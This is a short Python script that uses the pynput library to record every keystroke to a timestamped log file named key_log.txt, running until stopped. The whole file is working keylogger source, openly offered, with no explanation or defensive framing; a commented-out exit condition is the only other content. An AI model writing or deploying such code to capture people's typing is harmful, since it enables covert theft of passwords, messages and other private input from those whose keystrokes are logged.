#library
from pynput.keyboard import Key, Listener
#vanilla
import logging

#make a log file
log_dir = ""

logging.basicConfig(filename=(log_dir + "key_log.txt"), level=logging.DEBUG, format='%(asctime)s: %(message)s:')

def on_press(key):
    logging.info(str(key))
    #if key == key.asc:
     #return false
with Listener(on_press=on_press) as listener:
    listener.join()

